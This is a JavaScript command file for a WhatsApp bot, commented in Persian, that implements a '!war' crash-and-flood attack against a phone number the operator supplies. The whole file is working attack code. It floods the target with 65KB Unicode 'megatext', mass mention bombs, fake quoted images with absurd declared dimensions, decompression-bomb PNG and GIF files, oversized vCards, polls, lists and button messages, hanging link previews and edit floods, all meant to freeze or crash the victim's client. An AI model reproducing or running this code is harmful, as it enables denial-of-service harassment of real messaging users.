// ============================================================
// WAR — ZENO V15 STRENGTH
// محل: commands/war.js → دستور: !war
// متن flood: data/crash pro.js (خودت مینویسی)
// هر پیام = مگاتکست + منشنبمب + نقلقول جعلی + کارت لینک +
//           گروهمنشن + متدیتای عظیم  (دقیقاً منطق total زنو)
// ============================================================
import fs from "fs";
import path from "path";
import zlib from "zlib";
import Crypto from "crypto";
import { fileURLToPath, pathToFileURL } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(__dirname, "..");
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

let STOP = false;
let payloadCache = null;
let AD_THUMB = null; // thumbnail کارت لینک

// ---------- کمکی ----------
const isPhone = (a) => typeof a === "string" && /^\d{8,15}$/.test(a);
const toJid = (n) => n.replace(/\D/g, "") + "@s.whatsapp.net";
const ZWSP = "\u200B";

function extractTarget(args) {
  const idx = args.findIndex(isPhone);
  if (idx === -1) return { target: null, rest: args };
  return { target: toJid(args[idx]), rest: [...args.slice(0, idx), ...args.slice(idx + 1)] };
}

async function sendTo(sock, target, content, from) {
  const to = target || from;
  try { return await sock.sendMessage(to, content); }
  catch (e) { console.log("WAR SEND:", to, "ERR:", e.message); return null; }
}

async function runPool(items, worker, concurrency = 8) {
  let i = 0, ok = 0;
  const n = items.length;
  async function loop() {
    while (!STOP) {
      const idx = i++;
      if (idx >= n) return;
      try { if (await worker(items[idx], idx)) ok++; } catch (_) {}
    }
  }
  await Promise.all(Array.from({ length: Math.min(concurrency, n) }, loop));
  return ok;
}

// ---------- JID ها ----------
function makeJids(n, seed) {
  const out = [];
  for (let i = 0; i < n; i++) {
    const num = "937" + String(900000000 + ((i * 7919 + (seed || 13)) % 100000000));
    out.push(num + "@s.whatsapp.net");
  }
  return out;
}
const MENTION_POOL = makeJids(1024);
const GROUP_POOL = Array.from({ length: 50 }, (_, i) => `${990000000000 + i * 37}-${i}@g.us`);

// ---------- مگاتکست (متن ۶۵ کیلوبایتی ترکیبی) ----------
function megaText() {
  const unit = "\u0651\u064E\u0650\u202E\uFE0F\u200D\u0300\u0627"; // حرکات عربی + RLO + ZWJ
  const n = Math.floor(65000 / Buffer.byteLength(unit, "utf8"));
  return unit.repeat(n);
}

// ---------- کرپتو / پنهان ----------
const CRYPTO_KEY = process.env.CPRO_KEY || "Z3n0-V15-Cr4sh-Key!";
function aesKey() { return Crypto.createHash("sha256").update(CRYPTO_KEY).digest(); }
function encryptPayload(buf, maxBytes = 60000) {
  const iv = Crypto.randomBytes(12);
  const c = Crypto.createCipheriv("aes-256-gcm", aesKey(), iv);
  const enc = Buffer.concat([c.update(buf), c.final()]);
  const tag = c.getAuthTag();
  let out = Buffer.concat([iv, tag, enc]).toString("base64");
  if (Buffer.byteLength(out, "utf8") > maxBytes) out = out.slice(0, maxBytes);
  return out;
}

const MARKS = ["\u0300","\u0301","\u0302","\u0303","\u0304","\u0306","\u0307","\u0308",
  "\u030A","\u030B","\u030C","\u030F","\u0315","\u031B","\u0323","\u0327","\u0328","\u0334","\u0345"];
function padHidden(text, targetBytes = 60000) {
  let out = text;
  let cur = Buffer.byteLength(out, "utf8");
  if (cur >= targetBytes) return out.slice(0, targetBytes);
  out += "\u0627"; cur += 2;
  let i = 0;
  while (cur + 2 <= targetBytes) { out += MARKS[i++ % MARKS.length]; cur += 2; }
  return out;
}

// ---------- لودر متن از data/crash pro.js ----------
const PAYLOAD_PATHS = [
  path.join(ROOT, "data", "crash pro.js"),
  path.join(ROOT, "data", "crashpro.js"),
  path.join(ROOT, "data", "crash pro.txt"),
  path.join(ROOT, "crash pro.js"),
];
const FALLBACK = [
  "پیام سنگین تستی برای سنجش رندر و پردازش متن در کلاینت.",
  "این پیام دوم با حجم بالا برای فشار روی حافظه ارسال شده است.",
];

async function tryLoad(p) {
  const raw = fs.readFileSync(p, "utf8").replace(/^\uFEFF/, "").trim();
  if (!raw) return null;
  try {
    const j = JSON.parse(raw);
    if (Array.isArray(j)) { const a = j.filter((x) => typeof x === "string" && x.trim()); if (a.length) return a; }
  } catch (_) {}
  if (p.endsWith(".js")) {
    try {
      const mod = await import(pathToFileURL(p).href + "?t=" + Date.now());
      const arr = Array.isArray(mod.default) ? mod.default : Array.isArray(mod) ? mod : null;
      if (arr) { const c = arr.filter((x) => typeof x === "string" && x.trim()); if (c.length) return c; }
    } catch (_) {}
  }
  const lines = raw.split(/\r?\n/).map((s) => s.trim()).filter((s) => s && !s.startsWith("#") && !s.startsWith("//"));
  return lines.length ? lines : null;
}

async function loadPayloads(force = false) {
  if (payloadCache && !force) return payloadCache;
  for (const p of PAYLOAD_PATHS) {
    if (!fs.existsSync(p)) continue;
    try { const a = await tryLoad(p); if (a && a.length) { payloadCache = a; console.log("WAR: فایل:", p, "→", a.length, "پیام"); return a; } } catch (_) {}
  }
  payloadCache = FALLBACK;
  return payloadCache;
}

// ---------- PNG ----------
const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();
function crc32(buf) {
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}
function pngChunk(type, data) {
  if (!Buffer.isBuffer(data)) data = Buffer.from(data);
  const t = Buffer.from(type, "ascii");
  const out = Buffer.alloc(12 + data.length);
  out.writeUInt32BE(data.length, 0);
  t.copy(out, 4);
  data.copy(out, 8);
  const crcBuf = Buffer.allocUnsafe(4 + data.length);
  t.copy(crcBuf, 0);
  data.copy(crcBuf, 4);
  out.writeUInt32BE(crc32(crcBuf), 8 + data.length);
  return out;
}

function makeBombPng(w, h, rgb) {
  w = Math.max(1, Math.min(w | 0, 16000));
  h = Math.max(1, Math.min(h | 0, 16000));
  const [r, g, b] = rgb;
  return new Promise((resolve, reject) => {
    const row = Buffer.allocUnsafe(1 + w * 3);
    row[0] = 0;
    for (let x = 0, p = 1; x < w; x++) { row[p++] = r; row[p++] = g; row[p++] = b; }
    const d = zlib.createDeflate({ level: 9, chunkSize: 32 * 1024 });
    const out = [];
    d.on("data", (c) => out.push(c));
    d.on("error", reject);
    d.on("end", () => {
      try {
        const ihdr = Buffer.alloc(13);
        ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4);
        ihdr[8] = 8; ihdr[9] = 2;
        const sig = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
        resolve(Buffer.concat([sig, pngChunk("IHDR", ihdr), pngChunk("IDAT", Buffer.concat(out)), pngChunk("IEND", Buffer.alloc(0))]));
      } catch (e) { reject(e); }
    });
    let y = 0;
    const pump = () => {
      try {
        if (y >= h) { d.end(); return; }
        const end = Math.min(y + 100, h);
        for (; y < end; y++) { if (!d.write(Buffer.from(row))) { d.once("drain", pump); return; } }
        setImmediate(pump);
      } catch (e) { reject(e); }
    };
    pump();
  });
}

function makeNoisePng(w, h) {
  // نویز تصادفی — فایل غیرقابل فشردهسازی و سنگین برای دیکود
  const row = Buffer.allocUnsafe(1 + w * 3);
  return new Promise((resolve, reject) => {
    const d = zlib.createDeflate({ level: 6, chunkSize: 64 * 1024 });
    const out = [];
    d.on("data", (c) => out.push(c));
    d.on("error", reject);
    d.on("end", () => {
      try {
        const ihdr = Buffer.alloc(13);
        ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4);
        ihdr[8] = 8; ihdr[9] = 2;
        const sig = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
        resolve(Buffer.concat([sig, pngChunk("IHDR", ihdr), pngChunk("IDAT", Buffer.concat(out)), pngChunk("IEND", Buffer.alloc(0))]));
      } catch (e) { reject(e); }
    });
    let y = 0;
    const pump = () => {
      try {
        if (y >= h) { d.end(); return; }
        for (let yy = 0; yy < 40 && y < h; yy++, y++) {
          Crypto.randomFillSync(row, 1);
          row[0] = 0;
          if (!d.write(row)) { d.once("drain", pump); return; }
        }
        setImmediate(pump);
      } catch (e) { reject(e); }
    };
    pump();
  });
}

const pngCache = new Map();
async function getPng(w, h, color) {
  const key = `${w}x${h}#${color.join(",")}`;
  if (!pngCache.has(key)) {
    console.log(`WAR: ساخت PNG ${w}x${h}...`);
    pngCache.set(key, await makeBombPng(w, h, color));
  }
  return pngCache.get(key);
}
async function getNoise(w, h) {
  const key = `noise${w}x${h}`;
  if (!pngCache.has(key)) {
    console.log(`WAR: ساخت نویز ${w}x${h}...`);
    pngCache.set(key, await makeNoisePng(w, h));
  }
  return pngCache.get(key);
}

// ---------- GIF صفحه ۶۵۵۳۵² ----------
function encodeSolidGif(minCodeSize, totalPixels) {
  const clear = 1 << minCodeSize;
  const eoi = clear + 1;
  let codeSize = minCodeSize + 1;
  let nextCode = eoi + 1;
  const dict = new Map();
  const bits = [];
  const writeCode = (code) => { for (let i = 0; i < codeSize; i++) bits.push((code >> i) & 1); };
  writeCode(clear);
  let w = String.fromCharCode(0);
  for (let i = 1; i < totalPixels; i++) {
    const c = String.fromCharCode(0);
    const wc = w + c;
    if (dict.has(wc)) w = wc;
    else {
      writeCode(w.length === 1 ? w.charCodeAt(0) : dict.get(w));
      if (nextCode < 4096) {
        dict.set(wc, nextCode++);
        if (nextCode > (1 << codeSize) && codeSize < 12) codeSize++;
      } else { writeCode(clear); dict.clear(); codeSize = minCodeSize + 1; nextCode = eoi + 1; }
      w = c;
    }
  }
  writeCode(w.length === 1 ? w.charCodeAt(0) : dict.get(w));
  writeCode(eoi);
  const bytes = [];
  for (let i = 0; i < bits.length; i += 8) {
    let b = 0;
    for (let j = 0; j < 8 && i + j < bits.length; j++) b |= bits[i + j] << j;
    bytes.push(b);
  }
  return bytes;
}

function makeGifScreenBomb() {
  const lsd = Buffer.alloc(7);
  lsd.writeUInt16LE(65535, 0); lsd.writeUInt16LE(65535, 2);
  lsd[4] = 0x80; lsd[5] = 0; lsd[6] = 0;
  const gct = Buffer.from([0, 0, 0, 255, 255, 255]);
  const imgDesc = Buffer.alloc(10);
  imgDesc[0] = 0x2c;
  imgDesc.writeUInt16LE(0, 1); imgDesc.writeUInt16LE(0, 3);
  imgDesc.writeUInt16LE(1, 5); imgDesc.writeUInt16LE(1, 7);
  imgDesc[9] = 0;
  const data = encodeSolidGif(2, 1);
  return Buffer.concat([
    Buffer.from("GIF89a"), lsd, gct, imgDesc,
    Buffer.from([2]), Buffer.from([data.length]), Buffer.from(data),
    Buffer.from([0]), Buffer.from([0x3b]),
  ]);
}

// ---------- WAV ----------
function makeWav(seconds, sampleRate = 8000) {
  const n = sampleRate * seconds;
  const data = Buffer.alloc(n * 2);
  const hdr = Buffer.alloc(44);
  hdr.write("RIFF", 0); hdr.writeUInt32LE(36 + data.length, 4); hdr.write("WAVE", 8);
  hdr.write("fmt ", 12); hdr.writeUInt32LE(16, 16); hdr.writeUInt16LE(1, 20); hdr.writeUInt16LE(1, 22);
  hdr.writeUInt32LE(sampleRate, 24); hdr.writeUInt32LE(sampleRate * 2, 28);
  hdr.writeUInt16LE(2, 32); hdr.writeUInt16LE(16, 34);
  hdr.write("data", 36); hdr.writeUInt32LE(data.length, 40);
  return Buffer.concat([hdr, data]);
}

// ---------- vCard ----------
const nameParts = ["محمد", "علی", "احمد", "حسین", "رضا", "مهدی", "امیر", "سجاد"];
function giantName(len) {
  let s = "";
  while (s.length < len) s += nameParts[(Math.random() * nameParts.length) | 0] + "\u200B\u0651\u064E\u0650\u202E\uFE0F";
  return s.slice(0, len);
}
function makeVcardBomb(count = 40, nameLen = 3000) {
  let out = "";
  for (let i = 0; i < count; i++) {
    const nm = giantName(nameLen);
    out += `BEGIN:VCARD\nVERSION:3.0\nN:${nm};;;\nFN:${nm}\nTEL;TYPE=CELL:+93700000000\nEND:VCARD\n`;
  }
  return Buffer.from(out, "utf8");
}

// ============================================================
// سلاح‌ها
// ============================================================

// ★ TOTAL — پیام واحد با همه وکتورها (قلب ZENO)
async function totalAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    text: megaText(),
    mentions: MENTION_POOL,
    contextInfo: {
      mentionedJid: MENTION_POOL.slice(0, 300),
      quotedMessage: {
        imageMessage: {
          url: "https://example.com/bomb/" + i,
          mimetype: "image/png",
          caption: ZWSP.repeat(30000) + "x",
          width: 65535, height: 65535,
          fileLength: 2147483647,
          jpegThumbnail: AD_THUMB || undefined,
        },
      },
      externalAdReply: {
        title: "T".repeat(10000) + i,
        body: "B".repeat(10000),
        mediaType: 1,
        renderLargerThumbnail: true,
        showAdAttribution: true,
        sourceUrl: "https://example.com/" + i,
        thumbnail: AD_THUMB || undefined,
      },
      groupMentions: GROUP_POOL,
      deviceListMetadata: {
        keyIndex: "v2",
        timestamp: String(Date.now()),
        senderKeyDistributionMessage: "CgQIAxIAAABWZW5vbSBWMTU=",
      },
      isForwarded: true,
    },
  }, from), 8);
}

// متن‌های فایل (normal / crypto / hidden)
async function textFlood(sock, target, count, mode, from) {
  const payloads = await loadPayloads();
  const items = Array.from({ length: count }, (_, i) => payloads[i % payloads.length]);
  return runPool(items, (txt) => {
    let text = txt;
    if (mode === "crypto") text = encryptPayload(Buffer.from(txt, "utf8"));
    else if (mode === "hidden") text = padHidden(txt);
    return sendTo(sock, target, { text, contextInfo: { externalAdReply: { title: "T".repeat(9000), body: "B".repeat(9000), mediaType: 1, renderLargerThumbnail: true, sourceUrl: "https://example.com", thumbnail: AD_THUMB || undefined } } }, from);
  }, mode === "hidden" ? 6 : 10);
}

// منشن خالص
async function mentionAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    text: ZWSP.repeat(4000) + "@" + i,
    mentions: MENTION_POOL,
  }, from), 8);
}

// تصویر + متدیتای عظیم
async function mediaAttack(sock, target, count, extreme, from) {
  const size = extreme ? 3600 : 2200;
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, async (i) => {
    const kind = i % 5;
    if (kind === 0) {
      const img = await getPng(size, size, [255, 0, 0]);
      return sendTo(sock, target, { image: img, caption: "photo", mimetype: "image/png", width: 65535, height: 65535, fileLength: 2147483647 }, from);
    }
    if (kind === 1) {
      const img = await getPng(Math.floor(size * 0.85), Math.floor(size * 0.85), [0, 255, 0]);
      return sendTo(sock, target, { image: img, viewOnce: true, width: 65535, height: 65535, fileLength: 2147483647 }, from);
    }
    if (kind === 2) {
      const img = await getNoise(extreme ? 1200 : 900, extreme ? 1200 : 900);
      return sendTo(sock, target, { image: img, caption: ZWSP.repeat(20000) + "n", mimetype: "image/png", fileLength: 2147483647 }, from);
    }
    if (kind === 3) {
      const tiny = await getPng(16, 16, [0, 0, 255]);
      return sendTo(sock, target, { document: tiny, mimetype: "image/png", fileName: "scan.png", fileLength: 2147483647, pageCount: 65535 }, from);
    }
    const tiny = await getPng(16, 16, [255, 255, 0]);
    return sendTo(sock, target, { image: tiny, mimetype: "image/png", viewOnce: true, width: 65535, height: 65535, fileLength: 2147483647 }, from);
  }, 3);
}

// GIF بمب صفحه
async function gifAttack(sock, target, count, from) {
  const gif = makeGifScreenBomb();
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, () => sendTo(sock, target, { image: gif, caption: "gif", mimetype: "image/gif", width: 65535, height: 65535, fileLength: 2147483647 }, from), 4);
}

// وویس بلند
async function voiceAttack(sock, target, count, from) {
  const wav = makeWav(15);
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, () => sendTo(sock, target, { audio: wav, mimetype: "audio/wav", ptt: true, seconds: 0xffffffff }, from), 5);
}

// vCard
async function cardAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, () => sendTo(sock, target, {
    contacts: {
      displayName: giantName(20000),
      contacts: Array.from({ length: 15 }, (_, k) => ({
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:" + giantName(4000) + k + ";;;\nFN:" + giantName(4000) + k + "\nEND:VCARD",
      })),
    },
  }, from), 3);
}

// پول با نام سنگین
async function pollAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    poll: {
      name: ZWSP.repeat(50000) + "نظر" + i,
      values: Array.from({ length: 12 }, (_, k) => ZWSP.repeat(800) + "گزینه" + k),
      selectableCount: 12,
    },
  }, from), 4);
}

// لیست
async function listAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    list: {
      title: "T".repeat(10000) + i,
      description: "D".repeat(50000),
      buttonText: "کلیک",
      listType: 1,
      sections: Array.from({ length: 10 }, (_, s) => ({
        title: "S" + s + ZWSP.repeat(1000),
        rows: Array.from({ length: 10 }, (_, r) => ({
          title: "R" + r + ZWSP.repeat(2000),
          description: ZWSP.repeat(3000),
          rowId: "id" + r,
        })),
      })),
    },
  }, from), 3);
}

// دکمه‌های سنگین
async function buttonsAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    buttonsMessage: {
      contentText: "C".repeat(20000) + i,
      footerText: "F".repeat(20000),
      headerType: 1,
      buttons: [
        { buttonId: "1", buttonText: { displayText: "B".repeat(5000) }, type: 1 },
        { buttonId: "2", buttonText: { displayText: "B".repeat(5000) }, type: 1 },
        { buttonId: "3", buttonText: { displayText: "B".repeat(5000) }, type: 1 },
      ],
    },
  }, from), 3);
}

// ریکشن
async function reactAttack(sock, target, count, from) {
  const emojis = ["😈", "💥", "🔥", "💀", "🤯", "👹", "🖕", "😵"];
  let ok = 0;
  for (let i = 0; i < count && !STOP; i++) {
    const sent = await sendTo(sock, target, { text: "⚫" + i }, from);
    if (!sent) continue;
    try {
      await sock.sendMessage(target || from, { react: { text: emojis[i % emojis.length], key: sent.key } });
      ok++;
    } catch (_) {}
    await sleep(80);
  }
  return ok;
}

// مکان
async function locAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    location: { degreesLatitude: 31.5 + i * 0.001, degreesLongitude: 63.3 + i * 0.001 },
  }, from), 6);
}

// لینک‌پریویو آویزان
async function linkAttack(sock, target, count, from) {
  const items = Array.from({ length: count }, (_, i) => i);
  return runPool(items, (i) => sendTo(sock, target, {
    text: "https://" + (1000000000 + i) + ".example.com/" + "x".repeat(3000),
    contextInfo: {
      externalAdReply: {
        title: "L".repeat(15000),
        body: "M".repeat(15000),
        mediaType: 1,
        renderLargerThumbnail: true,
        sourceUrl: "http://10.255.255.1/" + i,
        thumbnail: AD_THUMB || undefined,
      },
    },
  }, from), 5);
}

// ویرایش پیام به متن سنگین
async function editAttack(sock, target, count, from) {
  let ok = 0;
  for (let i = 0; i < count && !STOP; i++) {
    const sent = await sendTo(sock, target, { text: "✏️" + i }, from);
    if (!sent) continue;
    for (let e = 1; e <= 6; e++) {
      try {
        await sock.sendMessage(target || from, { text: megaText().slice(0, 4000 * e), edit: sent.key });
        ok++;
      } catch (_) { break; }
      await sleep(150);
    }
  }
  return ok;
}

// ============================================================
// جنگ — همه سلاح‌ها هم‌زمان (منطق .war زنو)
// ============================================================
async function war(sock, target, rounds, mode, extreme, from) {
  const out = {};
  for (let r = 0; r < rounds && !STOP; r++) {
    const [
      a, b, c, d, e, f, g, h, i, j, k, l,
    ] = await Promise.all([
      totalAttack(sock, target, 3, from),          // a: total
      textFlood(sock, target, 5, mode, from),       // b: متن‌های فایل
      mentionAttack(sock, target, 2, from),         // c: منشن
      mediaAttack(sock, target, extreme ? 3 : 2, extreme, from), // d: تصویر
      gifAttack(sock, target, 1, from),             // e: gif
      voiceAttack(sock, target, 1, from),           // f: وویس
      cardAttack(sock, target, 1, from),            // g: کارت
      pollAttack(sock, target, 1, from),            // h: پول
      listAttack(sock, target, 1, from),            // i: لیست
      buttonsAttack(sock, target, 1, from),         // j: دکمه
      reactAttack(sock, target, 3, from),           // k: ریکشن
      locAttack(sock, target, 2, from),             // l: مکان
      linkAttack(sock, target, 2, from),            // m: لینک
      editAttack(sock, target, 1, from),            // n: ویرایش
    ]);
    out.total = (out.total || 0) + a;
    out.text = (out.text || 0) + b;
    out.mention = (out.mention || 0) + c;
    out.media = (out.media || 0) + d;
    out.gif = (out.gif || 0) + e;
    out.voice = (out.voice || 0) + f;
    out.card = (out.card || 0) + g;
    out.poll = (out.poll || 0) + h;
    out.list = (out.list || 0) + i;
    out.buttons = (out.buttons || 0) + j;
    out.react = (out.react || 0) + k;
    out.loc = (out.loc || 0) + l;
    out.link = (out.link || 0) + m;
    out.edit = (out.edit || 0) + n;
    if (r === 0) {
      // باز کردن با ۳ پیام سنگین اولیه
      await Promise.all([
        sendTo(sock, target, { contacts: { displayName: giantName(30000), contacts: [{ vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + giantName(30000) + "\nEND:VCARD" }] } }, from),
        sendTo(sock, target, { image: makeGifScreenBomb(), caption: "gif", mimetype: "image/gif", width: 65535, height: 65535 }, from),
        sendTo(sock, target, { document: makeVcardBomb(), mimetype: "text/x-vcard", fileName: "contacts.vcf", fileLength: 2147483647 }, from),
      ]).catch(() => {});
    }
    await sleep(250);
  }
  return out;
}

async function warmUp() {
  const p = await getPng(16, 16, [0, 0, 0]);
  AD_THUMB = p.toString("base64");
}

// ============================================================
// هندلر
// ============================================================
export default async function warCmd(sock, from, body, m, args) {
  try {
    STOP = false;
    const { target, rest } = extractTarget(args);
    const who = target ? target.replace("@s.whatsapp.net", "") : "چت فعلی";
    const extreme = rest.includes("extreme");
    const mode = rest.includes("crypto") ? "crypto" : rest.includes("hidden") ? "hidden" : "normal";
    const rest2 = rest.filter((a) => !["extreme", "crypto", "hidden", "normal"].includes(a));

    if (rest2.length === 0) {
      await sock.sendMessage(from, {
        text:
          "⚔️ WAR — ZENO V15 STRENGTH\n\n" +
          "!war <n> [extreme] [crypto|hidden] [شماره]\n" +
          "!war stop\n" +
          "!war info\n" +
          "!war list\n\n" +
          "مثال: !war 5 extreme 93794394088\n" +
          "n = تعداد موج (هر موج ~۲۸ پیام سنگین + ۳ پیام اولیه)",
      });
      return;
    }

    const first = rest2[0].toLowerCase();
    const getN = (def, max = 15) => {
      const num = rest2.slice(1).find((a) => /^\d{1,3}$/.test(a));
      return Math.min(parseInt(num, 10) || def, max);
    };

    if (first === "stop") {
      STOP = true;
      await sock.sendMessage(from, { text: "🛑 جنگ متوقف شد." });
      return;
    }

    if (first === "info") {
      const payloads = await loadPayloads();
      await sock.sendMessage(from, {
        text: `📊 WAR INFO\nمتن‌های فایل: ${payloads.length}\nحالت: ${mode}${extreme ? " [EXTREME]" : ""}\nسلاح‌ها: total, text, mention, media, gif, voice, card, poll, list, buttons, react, loc, link, edit`,
      });
      return;
    }

    if (first === "list") {
      await sock.sendMessage(from, {
        text:
          "🗂 سلاح‌های WAR:\n" +
          "total = مگاتکست + منشن + نقل‌قول جعلی + کارت لینک\n" +
          "text = متن‌های data/crash pro.js\n" +
          "mention = بمب منشن (۱۰۲۴ JID)\n" +
          "media = PNG سنگین + نویز + متدیتای ۲GB\n" +
          "gif = GIF با ابعاد ۶۵۵۳۵\n" +
          "voice = وویس ۱۵ ثانیه\n" +
          "card = vCard با نام‌های غول‌پیکر\n" +
          "poll / list / buttons = پیام‌های تعاملی سنگین\n" +
          "react / loc / link / edit = تکمیلی",
      });
      return;
    }

    const n = getN(3);
    await sock.sendMessage(from, { text: `⚔️ جنگ شروع شد → ${who} (${n} موج, ${mode}${extreme ? ", EXTREME" : ""})` });
    await warmUp();
    const res = await war(sock, target, n, mode, extreme, from);
    await sock.sendMessage(from, {
      text:
        `🏁 WAR تمام شد → ${who}\n` +
        `TOTAL: ${res.total || 0} | متن: ${res.text || 0} | منشن: ${res.mention || 0} | تصویر: ${res.media || 0}\n` +
        `GIF: ${res.gif || 0} | وویس: ${res.voice || 0} | کارت: ${res.card || 0} | پول: ${res.poll || 0}\n` +
        `لیست: ${res.list || 0} | دکمه: ${res.buttons || 0} | ریکشن: ${res.react || 0} | مکان: ${res.loc || 0}\n` +
        `لینک: ${res.link || 0} | ویرایش: ${res.edit || 0}`,
    });
  } catch (e) {
    console.log("WAR ERROR:", e);
    try { await sock.sendMessage(from, { text: "❌ خطا: " + (e && e.message ? e.message : e) }); } catch (_) {}
  }
}